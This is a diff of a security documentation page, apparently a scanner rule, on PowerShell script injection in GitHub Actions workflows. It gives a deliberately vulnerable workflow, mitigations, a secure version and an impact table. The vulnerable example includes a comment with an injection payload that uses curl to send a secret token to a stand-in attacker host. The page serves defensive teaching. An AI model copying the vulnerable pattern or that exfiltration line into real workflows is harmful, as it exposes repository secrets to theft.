@@ -1,90 +1,85 @@
 # Script Injection
 
-## Vulnerability Description
+## Description
 
+Workflows that use user-controlled input in dangerous PowerShell operations (Invoke-Expression, Invoke-Command, call operators) are vulnerable to script injection: attackers can inject malicious PowerShell commands that execute with the workflow's permissions, enabling secret exfiltration, file modification, or system compromise. PowerShell injection is particularly dangerous because injected commands run with full workflow permissions and can access secrets, modify repository contents, or perform unauthorized actions. [^gh_actions_security]
 
-Detected PowerShell injection vulnerability: {description}. This is CRITICAL because:
+## Vulnerable Instance
 
-- User input is used in dangerous PowerShell operations
+- Workflow uses user input (from pull request titles, issue comments, or workflow inputs) directly in PowerShell commands.
+- Input is used with Invoke-Expression, Invoke-Command, or call operators without validation.
+- Attacker can inject malicious PowerShell code.
 
-- Invoke-Expression, Invoke-Command, or call operators can execute arbitrary code
+```yaml
+name: Process PR Title
+on:
+  pull_request:
+jobs:
+  process:
+    runs-on: windows-latest
+    steps:
+      - name: Process input
+        shell: powershell
+        run: |
+          Invoke-Expression "${{ github.event.pull_request.title }}"
+          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
+```
 
-- Attackers can inject malicious PowerShell commands
+## Mitigation Strategies
 
-- Injected commands run with the workflows permissions
+1. **Use environment variables**  
+   Pass user input through environment variables instead of direct string interpolation. Access via `$env:VARIABLE_NAME` in PowerShell.
 
-- Attackers can access secrets, modify files, or compromise the system
+2. **Use PowerShell parameters**  
+   Use `-ParameterName` syntax and proper parameter binding. Avoid string interpolation in commands and validate all inputs.
 
+3. **Validate and sanitize inputs**  
+   Validate input types and formats, sanitize special characters, and use allowlists for permitted values. Reject inputs that don't match expected patterns.
 
-Attack scenario:
+4. **Avoid dangerous patterns**  
+   Never use Invoke-Expression, Invoke-Command, call operators (`&`), or dot sourcing (`.`) with user input. Use parameterized commands and proper quoting.
 
-1. Attacker provides malicious input
+5. **Use safe PowerShell practices**  
+   Prefer cmdlets over direct command execution. Use `-WhatIf` for destructive operations. Implement input validation at workflow and script levels.
 
-2. Input contains PowerShell injection payload
+6. **Review all PowerShell usage**  
+   Audit all PowerShell scripts in workflows for injection risks. Require code review for any workflow changes involving user input and PowerShell.
 
-3. PowerShell executes input in Invoke-Expression/Invoke-Command context
+### Secure Version
 
-4. Malicious code executes, compromising the system
+```yaml
+name: Process PR Title Safely
+on:
+  pull_request:
+jobs:
+  process:
+    runs-on: windows-latest
+    steps:
+      - name: Process input
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        shell: powershell
+        run: |
+          # Validate input
+          if ($env:PR_TITLE -notmatch '^[a-zA-Z0-9\s-]+$') {
+            Write-Error "Invalid input"
+            exit 1
+          }
+          Write-Host $env:PR_TITLE  # Safe - no injection
+```
 
+## Impact
 
-## Recommendation
+| Dimension | Severity | Notes |
+| --- | --- | --- |
+| Likelihood | ![Medium](https://img.shields.io/badge/-Medium-yellow?style=flat-square) | PowerShell injection requires user input in dangerous contexts, but is common when workflows process PR titles, comments, or inputs. |
+| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | Injected PowerShell commands run with workflow permissions, enabling secret exfiltration, code modification, or full system compromise. |
+| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Compromised workflows can affect all systems the workflow can access, including repositories, secrets, and deployment targets. |
 
+## References
 
-Use PowerShell parameters or environment variables instead of direct string interpolation:
+- GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [^gh_actions_security]
 
+---
 
-1. Use environment variables:
-
-- name: Run PowerShell
-
-env:
-
-USER_INPUT: ${{{{ github.event.pull_request.title }}}}
-
-shell: powershell
-
-run: |
-
-Write-Host \$env:USER_INPUT\  # Safer
-
-
-2. Use PowerShell parameters:
-
-- Use -ParameterName syntax
-
-- Avoid string interpolation in commands
-
-- Use proper parameter binding
-
-
-3. Validate and sanitize inputs:
-
-- Validate input types and formats
-
-- Sanitize special characters
-
-- Use allowlists for permitted values
-
-
-4. Avoid dangerous patterns:
-
-- Never use Invoke-Expression with user input
-
-- Never use Invoke-Command with user input
-
-- Never use call operator (&) with user input
-
-- Never use dot sourcing (.) with user input
-
-
-5. Use safe PowerShell practices:
-
-- Use parameterized commands
-
-- Use proper quoting
-
-- Validate all user inputs
-
-
-6. Review all PowerShell script usage for injection risks
-
+[^gh_actions_security]: GitHub Docs, "Security hardening for GitHub Actions," https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
